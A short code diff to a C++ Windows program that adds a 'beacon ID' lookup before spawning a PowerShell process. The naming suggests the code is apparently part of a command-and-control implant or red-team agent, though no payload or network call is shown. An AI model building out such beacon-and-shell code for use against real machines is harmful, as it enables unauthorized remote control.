@@ -1,8 +1,12 @@
 #include <Windows.h>
 #include <iostream>
 #include "ProcessHelper.h"
+#include "HostOperations.h"
 
 int main() {
+
+	std::string id = HostOperations::GetBeaconId();
+
 	ProcessHelper::create_powershell_process();
 
 	std::string output;
